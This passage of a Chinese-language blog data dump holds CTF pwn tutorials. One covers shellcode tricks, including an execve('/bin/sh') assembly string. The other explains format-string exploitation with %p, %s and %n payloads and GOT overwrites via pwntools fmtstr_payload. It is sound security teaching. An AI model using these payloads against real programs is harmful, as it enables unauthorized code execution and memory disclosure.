0x68732f6e69622f;pop rdi;syscall&quot;</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"3-asm-函数\"><a href=\"#3-asm-函数\" class=\"headerlink\" title=\"3. asm()函数\"></a>3. asm()函数</h3><p>pwntools 提供了 <code>asm()</code> 快速把汇编翻译成字节码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h2 id=\"小tips\"><a href=\"#小tips\" class=\"headerlink\" title=\"小tips\"></a>小tips</h2><h3 id=\"1-绕过字符串检测（strlen-等）—-push-0\"><a href=\"#1-绕过字符串检测（strlen-等）—-push-0\" class=\"headerlink\" title=\"1. 绕过字符串检测（strlen 等）—&gt; push 0;\"></a>1. 绕过字符串检测（strlen 等）—&gt; <strong>push 0;</strong></h3><p>有些题目会检测输入的字符串，如果包含 <code>\\x00</code> 截断（如 <code>strlen</code>），可以利用<code>push 0</code> 在栈上手动压入空字符，避免直接输入 <code>\\x00</code>（这个会导致你写入的目标汇编被截成其他无效汇编，执行不可知的操作）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 0              ; 压入 \\x00</span><br><span class=\"line\">mov rsi, rsp</span><br></pre></td></tr></table></figure>\n\n<p>这样就能通过可打印字符串的检验了。</p>\n<hr>\n<h3 id=\"2-没有-bin-sh-—-写入-bin-sh到映射的内存中\"><a href=\"#2-没有-bin-sh-—-写入-bin-sh到映射的内存中\" class=\"headerlink\" title=\"2.没有/bin/sh  —&gt;写入/bin/sh到映射的内存中\"></a>2.没有<code>/bin/sh</code>  —&gt;写入<code>/bin/sh</code>到映射的内存中</h3><p><code>.ljust()</code>函数：用二参向右填充满一参字节，不会覆盖原有数据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode.ljust(<span class=\"number\">0x50</span>,<span class=\"string\">b&quot;\\x00&quot;</span>)+<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span> </span><br></pre></td></tr></table></figure>\n<p>此时<code>/bin/sh</code>的地址就是<code>0x111050</code>（假设映射地址是<code>0x111000</code>），<code>mov rdi, 0x111050</code>即可。</p>\n<hr>\n<h3 id=\"3-mov-消耗过大-—-push-pop\"><a href=\"#3-mov-消耗过大-—-push-pop\" class=\"headerlink\" title=\"3.mov 消耗过大 —&gt; push + pop\"></a>3.mov 消耗过大 —&gt; <strong>push + pop</strong></h3><p>如<code>mov rsi,0;</code>可以用<code>push 0; pop rsi;</code>代替，节省字节数。</p>\n<hr>\n<h3 id=\"4-翻译汇编的网站\"><a href=\"#4-翻译汇编的网站\" class=\"headerlink\" title=\"4.翻译汇编的网站\"></a>4.翻译汇编的网站</h3><p>可以使用 <a href=\"https://defuse.ca/online-x86-assembler.htm\">https://defuse.ca/online-x86-assembler.htm</a> 这个网站把汇编代码翻译成机器码。<br>师傅们可以使用这个工具来调试和优化自己的 shellcode。</p>\n<hr>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li><strong>mmap</strong> 常用于获取一片可执行内存，用来写 shellcode。</li>\n<li><strong>syscall 编号</strong> 可以记一下，尤其是 read&#x2F;write&#x2F;open&#x2F;execve。</li>\n<li>写字符串时注意 <code>\\x00</code> 截断问题，必要时用 <code>push 0；</code> 手动补。</li>\n<li><code>mov</code> 指令有时过长，可以用 <code>push + pop</code> 代替。</li>\n</ul>\n<hr>\n","excerpt":"","more":"<h1 id=\"Shellcode-汇编小-Tips\"><a href=\"#Shellcode-汇编小-Tips\" class=\"headerlink\" title=\"Shellcode 汇编小 Tips\"></a>Shellcode 汇编小 Tips</h1><p>如果shellcraft不适用，我们往往需要手写汇编构造更简短的 shellcode。本文整理了一些小技巧，帮助你快速写出合适的 shellcode。</p>\n<hr>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><h3 id=\"1-mmap-与可执行内存\"><a href=\"#1-mmap-与可执行内存\" class=\"headerlink\" title=\"1.mmap 与可执行内存\"></a>1.mmap 与可执行内存</h3><p>有些题目会先用 <code>mmap</code> 给我们一块可读可写可执行的内存，比如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">secret = (__int64)mmap((<span class=\"type\">void</span> *)<span class=\"number\">0x111000</span>, <span class=\"number\">0x1000u</span>LL, <span class=\"number\">7</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>第一参数：映射地址（0 表示随机，&gt;0x10000 时映射到自己）</li>\n<li>第二参数：长度</li>\n<li>第三参数：保护权限（7 &#x3D; r + w + x&#x3D;1+2+4）</li>\n<li>第五参数：文件句柄（-1 表示匿名）</li>\n</ul>\n<p>我们就可以把 <strong>shellcode</strong> 写入到这片内存里并<strong>执行</strong>。</p>\n<hr>\n<h3 id=\"2-常见-syscall-编号\"><a href=\"#2-常见-syscall-编号\" class=\"headerlink\" title=\"2. 常见 syscall 编号\"></a>2. 常见 syscall 编号</h3><p>Linux x64 下，常用的系统调用号：</p>\n<ul>\n<li><code>read</code>  &#x3D; 0</li>\n<li><code>write</code> &#x3D; 1</li>\n<li><code>open</code>  &#x3D; 2</li>\n<li><code>execve</code> &#x3D; 59 (0x3b)</li>\n</ul>\n<p>执行系统调用的一般步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rax, &lt;syscall号&gt;   ; 系统调用号放在 rax</span><br><span class=\"line\">mov rdi, &lt;参数1&gt;</span><br><span class=\"line\">mov rsi, &lt;参数2&gt;</span><br><span class=\"line\">mov rdx, &lt;参数3&gt;</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n\n<p>比如执行 <code>/bin/sh</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execve(&quot;/bin/sh&quot;, 0, 0)</span><br></pre></td></tr></table></figure>\n\n<p>对应寄存器：</p>\n<ul>\n<li><code>rax = 59</code></li>\n<li><code>rdi = &quot;/bin/sh&quot;</code></li>\n<li><code>rsi = 0</code></li>\n<li><code>rdx = 0</code></li>\n</ul>\n<p><strong>对应汇编</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=&quot;mov rsi,0;mov rdx,0;mov rax,59;push 0x68732f6e69622f;pop rdi;syscall&quot;</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"3-asm-函数\"><a href=\"#3-asm-函数\" class=\"headerlink\" title=\"3. asm()函数\"></a>3. asm()函数</h3><p>pwntools 提供了 <code>asm()</code> 快速把汇编翻译成字节码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h2 id=\"小tips\"><a href=\"#小tips\" class=\"headerlink\" title=\"小tips\"></a>小tips</h2><h3 id=\"1-绕过字符串检测（strlen-等）—-push-0\"><a href=\"#1-绕过字符串检测（strlen-等）—-push-0\" class=\"headerlink\" title=\"1. 绕过字符串检测（strlen 等）—&gt; push 0;\"></a>1. 绕过字符串检测（strlen 等）—&gt; <strong>push 0;</strong></h3><p>有些题目会检测输入的字符串，如果包含 <code>\\x00</code> 截断（如 <code>strlen</code>），可以利用<code>push 0</code> 在栈上手动压入空字符，避免直接输入 <code>\\x00</code>（这个会导致你写入的目标汇编被截成其他无效汇编，执行不可知的操作）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 0              ; 压入 \\x00</span><br><span class=\"line\">mov rsi, rsp</span><br></pre></td></tr></table></figure>\n\n<p>这样就能通过可打印字符串的检验了。</p>\n<hr>\n<h3 id=\"2-没有-bin-sh-—-写入-bin-sh到映射的内存中\"><a href=\"#2-没有-bin-sh-—-写入-bin-sh到映射的内存中\" class=\"headerlink\" title=\"2.没有/bin/sh  —&gt;写入/bin/sh到映射的内存中\"></a>2.没有<code>/bin/sh</code>  —&gt;写入<code>/bin/sh</code>到映射的内存中</h3><p><code>.ljust()</code>函数：用二参向右填充满一参字节，不会覆盖原有数据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode.ljust(<span class=\"number\">0x50</span>,<span class=\"string\">b&quot;\\x00&quot;</span>)+<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span> </span><br></pre></td></tr></table></figure>\n<p>此时<code>/bin/sh</code>的地址就是<code>0x111050</code>（假设映射地址是<code>0x111000</code>），<code>mov rdi, 0x111050</code>即可。</p>\n<hr>\n<h3 id=\"3-mov-消耗过大-—-push-pop\"><a href=\"#3-mov-消耗过大-—-push-pop\" class=\"headerlink\" title=\"3.mov 消耗过大 —&gt; push + pop\"></a>3.mov 消耗过大 —&gt; <strong>push + pop</strong></h3><p>如<code>mov rsi,0;</code>可以用<code>push 0; pop rsi;</code>代替，节省字节数。</p>\n<hr>\n<h3 id=\"4-翻译汇编的网站\"><a href=\"#4-翻译汇编的网站\" class=\"headerlink\" title=\"4.翻译汇编的网站\"></a>4.翻译汇编的网站</h3><p>可以使用 <a href=\"https://defuse.ca/online-x86-assembler.htm\">https://defuse.ca/online-x86-assembler.htm</a> 这个网站把汇编代码翻译成机器码。<br>师傅们可以使用这个工具来调试和优化自己的 shellcode。</p>\n<hr>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li><strong>mmap</strong> 常用于获取一片可执行内存，用来写 shellcode。</li>\n<li><strong>syscall 编号</strong> 可以记一下，尤其是 read&#x2F;write&#x2F;open&#x2F;execve。</li>\n<li>写字符串时注意 <code>\\x00</code> 截断问题，必要时用 <code>push 0；</code> 手动补。</li>\n<li><code>mov</code> 指令有时过长，可以用 <code>push + pop</code> 代替。</li>\n</ul>\n<hr>\n"},{"title":"Day 05 格式化字符串漏洞","date":"2025-08-30T16:00:00.000Z","top_img":"/images/background/狐妖/00.jpg","cover":"/images/background/狐妖/4.jpg","_content":"# 格式化字符串漏洞\n\n## 1. 漏洞原理\n\n在 C 语言中，`printf` 这一类函数会根据传入的 **格式化字符串**（format string）解析参数，例如：\n\n```c\nprintf(\"hello %s\\n\", name);\n```\n\n但如果程序员直接写成：\n\n```c\nprintf(input);\n```\n\n而没有提供额外参数，用户输入就会直接被当成格式化字符串解析。这时攻击者可以通过特殊的格式符（如 `%p`、`%s`、`%n`）来读取或写入内存，从而造成严重漏洞。\n\n------\n\n## 2. 基本利用方式\n\n### (1) `%p` —— 打印栈上的地址\n\n- `%p` 会从栈上依次取出参数并以指针形式打印，不会解引用。\n- 在没有参数的情况下，`printf` 还是会从栈上取值，因此我们能通过连续输入多个 `%p` 来泄露栈上的内容。\n\n**示例：**\n\n```bash\n输入: %p  #打印二参的地址               \n输入: %7$p #打印第八个参数的地址\n```\n\n------\n\n### (2) `%s` —— 打印指定地址的字符串\n\n- `%s` 会把栈上的值当作 **指针**，然后尝试打印这个地址对应的字符串(解引用)。\n\n**示例：**\n\n```bash\n输入: %4$s #打印第五个参数解引用后的值\n```\n\n表示取栈上第 5 个参数的值作为地址，并打印字符串。\n 如果这个地址正好是 `flag` 所在位置，就能直接泄露内容。\n\n------\n\n### (3) `%n` —— 写入内存\n\n- `%n` 会把 **当前已输出的字符数** 写入到对应的参数地址中。\n- 这意味着攻击者可以 **往任意地址写入整数**，从而修改内存关键位置（如 GOT 表）。\n\n**示例：**\n\n```bash\n输入: AAAA%n\n```\n\n会将输出的字符数（4）写入栈上取出的地址。\n\n配合偏移控制：\n\n```bash\n输入: %10$n\n```\n\n会将输出字符数写入栈上第 11个参数所指向的地址。\n\n**用途：**\n\n- 任意地址写（最关键的利用手段）。\n- 可用来覆盖 GOT 表条目（got表可写时，即partial RELRO），把函数指针劫持到 `system`。\n\n------\n\n## 3. 常见利用流程\n\n1. **信息泄露**\n\n   - 用 `%p` 打印大量内容，找到栈上或 GOT/PIE 地址。\n   - 用 `%s` 配合偏移泄露内存，获取 libc 地址。\n\n2. **任意写**\n\n   - 用 `%n` 向 GOT 表写入 `system` 地址，可以用`fmtstr_payload(offset, writes, numbwritten, write_size)`这个函数改写got表。`offset`是字符串偏移值，使用pwndbg调试找到输入所在的参数位置，`writes`是键值对，形如`{printf.got:system.plt}`，键是要改写的地址，值是目标函数的plt调用地址。后面两个参数一般默认。\n\n   - 示例：`payload=fmtstr_payload(6,{0x601030:0x40085D})`   \n\n     0x601030指printf的.got.plt地址，0x40085D指system的.plt地址。\n\n3. **拿 shell**\n\n   - 覆盖 `printf` 的 GOT 为 `system`，然后再次调用时输入 `/bin/sh`。\n\n\n\n------\n\n## 4. 小技巧\n\n- **指定参数位置**：\n   `%7$p` → 打印第 8个参数；\n   `%12$s` → 打印第 13个参数指向的字符串。\n   这样能精确控制泄露和写入。\n\n- **控制写入的值**：\n   `%n` 写入的是“已经打印的字符数”，所以需要通过 `%xxx` 的方式控制输出长度。例如：\n\n  ```bash\n  AAAA%1234c%10$n\n  ```\n\n  会在输出 `AAAA` 后打印 1234 个字符，总共 1238 个字符，然后把 1238 写入第 11 个参数的地址。   \n- **关于offset和%x$的取值**：\n![exp](https://img.cdn1.vip/i/68b3bfcf13554_1756610511.webp)\noffset=x=6 + 上图最左边那列的编号数\n------\n\n## 5. 总结\n\n- `%p` → 泄露地址。\n- `%s` → 任意地址解引用。\n- `%n` → 任意地址写（修改 GOT、函数指针）。\n\n利用链：\n 信息泄露 → 找 libc → 任意写 → 劫持控制流 → getshell。\n\n------\n\n","source":"_posts/Day 05 格式化字符串漏洞.md","raw":"---\ntitle: Day 05 格式化字符串漏洞\ndate: 2025-08-31\ntags:\n  - pwntools\n  - format-string\n  - ubuntu\ncategories: pwn\ntop_img: /images/background/狐妖/00.jpg\ncover: /images/background/狐妖/4.jpg\n---\n# 格式化字符串漏洞\n\n## 1. 漏洞原理\n\n在 C 语言中，`printf` 这一类函数会根据传入的 **格式化字符串**（format string）解析参数，例如：\n\n```c\nprintf(\"hello %s\\n\", name);\n```\n\n但如果程序员直接写成：\n\n```c\nprintf(input);\n```\n\n而没有提供额外参数，用户输入就会直接被当成格式化字符串解析。这时攻击者可以通过特殊的格式符（如 `%p`、`%s`、`%n`）来读取或写入内存，从而造成严重漏洞。\n\n------\n\n## 2. 基本利用方式\n\n### (1) `%p` —— 打印栈上的地址\n\n- `%p` 会从栈上依次取出参数并以指针形式打印，不会解引用。\n- 在没有参数的情况下，`printf` 还是会从栈上取值，因此我们能通过连续输入多个 `%p` 来泄露栈上的内容。\n\n**示例：**\n\n```bash\n输入: %p  #打印二参的地址               \n输入: %7$p #打印第八个参数的地址\n```\n\n------\n\n### (2) `%s` —— 打印指定地址的字符串\n\n- `%s` 会把栈上的值当作 **指针**，然后尝试打印这个地址对应的字符串(解引用)。\n\n**示例：**\n\n```bash\n输入: %4$s #打印第五个参数解引用后的值\n```\n\n表示取栈上第 5 个参数的值作为地址，并打印字符串。\n 如果这个地址正好是 `flag` 所在位置，就能直接泄露内容。\n\n------\n\n### (3) `%n` —— 写入内存\n\n- `%n` 会把 **当前已输出的字符数** 写入到对应的参数地址中。\n- 这意味着攻击者可以 **往任意地址写入整数**，从而修改内存关键位置（如 GOT 表）。\n\n**示例：**\n\n```bash\n输入: AAAA%n\n```\n\n会将输出的字符数（4）写入栈上取出的地址。\n\n配合偏移控制：\n\n```bash\n输入: %10$n\n```\n\n会将输出字符数写入栈上第 11个参数所指向的地址。\n\n**用途：**\n\n- 任意地址写（最关键的利用手段）。\n- 可用来覆盖 GOT 表条目（got表可写时，即partial RELRO），把函数指针劫持到 `system`。\n\n------\n\n## 3. 常见利用流程\n\n1. **信息泄露**\n\n   - 用 `%p` 打印大量内容，找到栈上或 GOT/PIE 地址。\n   - 用 `%s` 配合偏移泄露内存，获取 libc 地址。\n\n2. **任意写**\n\n   - 用 `%n` 向 GOT 表写入 `system` 地址，可以用`fmtstr_payload(offset, writes, numbwritten, write_size)`这个函数改写got表。`offset`是字符串偏移值，使用pwndbg调试找到输入所在的参数位置，`writes`是键值对，形如`{printf.got:system.plt}`，键是要改写的地址，值是目标函数的plt调用地址。后面两个参数一般默认。\n\n   - 示例：`payload=fmtstr_payload(6,{0x601030:0x40085D})`   \n\n     0x601030指printf的.got.plt地址，0x40085D指system的.plt地址。\n\n3. **拿 shell**\n\n   - 覆盖 `printf` 的 GOT 为 `system`，然后再次调用时输入 `/bin/sh`。\n\n\n\n------\n\n## 4. 小技巧\n\n- **指定参数位置**：\n   `%7$p` → 打印第 8个参数；\n   `%12$s` → 打印第 13个参数指向的字符串。\n   这样能精确控制泄露和写入。\n\n- **控制写入的值**：\n   `%n` 写入的是“已经打印的字符数”，所以需要通过 `%xxx` 的方式控制输出长度。例如：\n\n  ```bash\n  AAAA%1234c%10$n\n  ```\n\n  会在输出 `AAAA` 后打印 1234 个字符，总共 1238 个字符，然后把 1238 写入第 11 个参数的地址。   \n- **关于offset和%x$的取值**：\n![exp](https://img.cdn1.vip/i/68b3bfcf13554_1756610511.webp)\noffset=x=6 + 上图最左边那列的编号数\n------\n\n## 5. 总结\n\n- `%p` → 泄露地址。\n- `%s` → 任意地址解引用。\n- `%n` → 任意地址写（修改 GOT、函数指针）。\n\n利用链：\n 信息泄露 → 找 libc → 任意写 → 劫持控制流 → getshell。\n\n------\n\n","slug":"Day 05 格式化字符串漏洞","published":1,"updated":"2025-09-22T06:18:18.925Z","_id":"cmez3h6o000002gt87y8v0ipi","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"格式化字符串漏洞\"><a href=\"#格式化字符串漏洞\" class=\"headerlink\" title=\"格式化字符串漏洞\"></a>格式化字符串漏洞</h1><h2 id=\"1-漏洞原理\"><a href=\"#1-漏洞原理\" class=\"headerlink\" title=\"1. 漏洞原理\"></a>1. 漏洞原理</h2><p>在 C 语言中，<code>printf</code> 这一类函数会根据传入的 <strong>格式化字符串</strong>（format string）解析参数，例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello %s\\n&quot;</span>, name);</span><br></pre></td></tr></table></figure>\n\n<p>但如果程序员直接写成：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(input);</span><br></pre></td></tr></table></figure>\n\n<p>而没有提供额外参数，用户输入就会直接被当成格式化字符串解析。这时攻击者可以通过特殊的格式符（如 <code>%p</code>、<code>%s</code>、<code>%n</code>）来读取或写入内存，从而造成严重漏洞。</p>\n<hr>\n<h2 id=\"2-基本利用方式\"><a href=\"#2-基本利用方式\" class=\"headerlink\" title=\"2. 基本利用方式\"></a>2. 基本利用方式</h2><h3 id=\"1-p-——-打印栈上的地址\"><a href=\"#1-p-——-打印栈上的地址\" class=\"headerlink\" title=\"(1) %p —— 打印栈上的地址\"></a>(1) <code>%p</code> —— 打印栈上的地址</h3><ul>\n<li><code>%p</code> 会从栈上依次取出参数并以指针形式打印，不会解引用。</li>\n<li>在没有参数的情况下，<code>printf</code> 还是会从栈上取值，因此我们能通过连续输入多个 <code>%p</code> 来泄露栈上的内容。</li>\n</ul>\n<p><strong>示例：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: %p  <span class=\"comment\">#打印二参的地址               </span></span><br><span class=\"line\">输入: %7<span class=\"variable\">$p</span> <span class=\"comment\">#打印第八个参数的地址</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"2-s-——-打印指定地址的字符串\"><a href=\"#2-s-——-打印指定地址的字符串\" class=\"headerlink\" title=\"(2) %s —— 打印指定地址的字符串\"></a>(2) <code>%s</code> —— 打印指定地址的字符串</h3><ul>\n<li><code>%s</code> 会把栈上的值当作 <strong>指针</strong>，然后尝试打印这个地址对应的字符串(解引用)。</li>\n</ul>\n<p><strong>示例：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: %4<span class=\"variable\">$s</span> <span class=\"comment\">#打印第五个参数解引用后的值</span></span><br></pre></td></tr></table></figure>\n\n<p>表示取栈上第 5 个参数的值作为地址，并打印字符串。<br> 如果这个地址正好是 <code>flag</code> 所在位置，就能直接泄露内容。</p>\n<hr>\n<h3 id=\"3-n-——-写入内存\"><a href=\"#3-n-——-写入内存\" class=\"headerlink\" title=\"(3) %n —— 写入内存\"></a>(3) <code>%n</code> —— 写入内存</h3><ul>\n<li><code>%n</code> 会把 <strong>当前已输出的字符数</strong> 写入到对应的参数地址中。</li>\n<li>这意味着攻击者可以 <strong>往任意地址写入整数</strong>，从而修改内存关键位置（如 GOT 表）。</li>\n</ul>\n<p><strong>示例：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: AAAA%n</span><br></pre></td></tr></table></figure>\n\n<p>会将输出的字符数（4）写入栈上取出的地址。</p>\n<p>配合偏移控制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: %10<span class=\"variable\">$n</span></span><br></pre></td></tr></table></figure>\n\n<p>会将输出字符数写入栈上第 11个参数所指向的地址。</p>\n<p><strong>用途：</strong></p>\n<ul>\n<li>任意地址写（最关键的利用手段）。</li>\n<li>可用来覆盖 GOT 表条目（got表可写时，即partial RELRO），把函数指针劫持到 <code>system</code>。</li>\n</ul>\n<hr>\n<h2 id=\"3-常见利用流程\"><a href=\"#3-常见利用流程\" class=\"headerlink\" title=\"3. 常见利用流程\"></a>3. 常见利用流程</h2><ol>\n<li><p><strong>信息泄露</strong></p>\n<ul>\n<li>用 <code>%p</code> 打印大量内容，找到栈上或 GOT&#x2F;PIE 地址。</li>\n<li>用 <code>%s</code> 配合偏移泄露内存，获取 libc 地址。</li>\n</ul>\n</li>\n<li><p><strong>任意写</strong></p>\n<ul>\n<li><p>用 <code>%n</code> 向 GOT 表写入 <code>system</code> 地址，可以用<code>fmtstr_payload(offset, writes, numbwritten, write_size)</code>这个函数改写got表。<code>offset</code>是字符串偏移值，使用pwndbg调试找到输入所在的参数位置，<code>writes</code>是键值对，形如<code>&#123;printf.got:system.plt&#125;</code>，键是要改写的地址，值是目标函数的plt调用地址。后面两个参数一般默认。</p>\n</li>\n<li><p>示例：<code>payload=fmtstr_payload(6,&#123;0x601030:0x40085D&#125;)</code>   </p>\n<p>0x601030指printf的.got.plt地址，0x40085D指system的.plt地址。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>拿 shell</strong></p>\n<ul>\n<li>覆盖 <code>printf</code> 的 GOT 为 <code>system</code>，然后再次调用时输入 <code>/bin/sh</code>。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"4-小技巧\"><a href=\"#4-小技巧\" class=\"headerlink\" title=\"4. 小技巧\"></a>4. 小技巧</h2><ul>\n<li><p><strong>指定参数位置</strong>：<br> <code>%7$p</code> → 打印第 8个参数；<br> <code>%12$s</code> → 打印第 13个参数指向的字符串。<br> 这样能精确控制泄露和写入。</p>\n</li>\n<li><p><strong>控制写入的值</strong>：<br> <code>%n</code> 写入的是“已经打印的字符数”，所以需要通过 <code>%xxx</code> 的方式控制输出长度。例如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AAAA%1234c%10<span class=\"variable\">$n</span></span><br></pre></td></tr></table></figure>\n\n<p>会在输出 <code>AAAA</code> 后打印 1234 个字符，总共 1238 个字符，然后把 1238 写入第 11 个参数的地址。   </p>\n</li>\n<li><p><strong>关于offset和%x$的取值</strong>：<br><img src=\"https://img.cdn1.vip/i/68b3bfcf13554_1756610511.webp\" alt=\"exp\"><br>offset&#x3D;x&#x3D;6 + 上图最左边那列的编号数</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5. 总结\"></a>5. 总结</h2><ul>\n<li><code>%p</code> → 泄露地址。</li>\n<li><code>%s</code> → 任意地址解引用。</li>\n<li><code>%n</code> → 任意地址写（修改 GOT、函数指针）。</li>\n</ul>\n<p>利用链：<br> 信息泄露 → 找 libc → 任意写 → 劫持控制流 → getshell。</p>\n<hr>\n","excerpt":"","more":"<h1 id=\"格式化字符串漏洞\"><a href=\"#格式化字符串漏洞\" class=\"headerlink\" title=\"格式化字符串漏洞\"></a>格式化字符串漏洞</h1><h2 id=\"1-漏洞原理\"><a href=\"#1-漏洞原理\" class=\"headerlink\" title=\"1. 漏洞原理\"></a>1. 漏洞原理</h2><p>在 C 语言中，<code>printf</code> 这一类函数会根据传入的 <strong>格式化字符串</strong>（format string）解析参数，例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello %s\\n&quot;</span>, name);</span><br></pre></td></tr></table></figure>\n\n<p>但如果程序员直接写成：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(input);</span><br></pre></td></tr></table></figure>\n\n<p>而没有提供额外参数，用户输入就会直接被当成格式化字符串解析。这时攻击者可以通过特殊的格式符（如 <code>%p</code>、<code>%s</code>、<code>%n</code>）来读取或写入内存，从而造成严重漏洞。</p>\n<hr>\n<h2 id=\"2-基本利用方式\"><a href=\"#2-基本利用方式\" class=\"headerlink\" title=\"2. 基本利用方式\"></a>2. 基本利用方式</h2><h3 id=\"1-p-——-打印栈上的地址\"><a href=\"#1-p-——-打印栈上的地址\" class=\"headerlink\" title=\"(1) %p —— 打印栈上的地址\"></a>(1) <code>%p</code> —— 打印栈上的地址</h3><ul>\n<li><code>%p</code> 会从栈上依次取出参数并以指针形式打印，不会解引用。</li>\n<li>在没有参数的情况下，<code>printf</code> 还是会从栈上取值，因此我们能通过连续输入多个 <code>%p</code> 来泄露栈上的内容。</li>\n</ul>\n<p><strong>示例：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: %p  <span class=\"comment\">#打印二参的地址               </span></span><br><span class=\"line\">输入: %7<span class=\"variable\">$p</span> <span class=\"comment\">#打印第八个参数的地址</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"2-s-——-打印指定地址的字符串\"><a href=\"#2-s-——-打印指定地址的字符串\" class=\"headerlink\" title=\"(2) %s —— 打印指定地址的字符串\"></a>(2) <code>%s</code> —— 打印指定地址的字符串</h3><ul>\n<li><code>%s</code> 会把栈上的值当作 <strong>指针</strong>，然后尝试打印这个地址对应的字符串(解引用)。</li>\n</ul>\n<p><strong>示例：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: %4<span class=\"variable\">$s</span> <span class=\"comment\">#打印第五个参数解引用后的值</span></span><br></pre></td></tr></table></figure>\n\n<p>表示取栈上第 5 个参数的值作为地址，并打印字符串。<br> 如果这个地址正好是 <code>flag</code> 所在位置，就能直接泄露内容。</p>\n<hr>\n<h3 id=\"3-n-——-写入内存\"><a href=\"#3-n-——-写入内存\" class=\"headerlink\" title=\"(3) %n —— 写入内存\"></a>(3) <code>%n</code> —— 写入内存</h3><ul>\n<li><code>%n</code> 会把 <strong>当前已输出的字符数</strong> 写入到对应的参数地址中。</li>\n<li>这意味着攻击者可以 <strong>往任意地址写入整数</strong>，从而修改内存关键位置（如 GOT 表）。</li>\n</ul>\n<p><strong>示例：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入: AAAA%n</span><br></pre></td></tr></table></figure>\n\n<p>会将输出的字符数（4）写入栈上取出的地址。</p>\n<p>配合偏移控制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 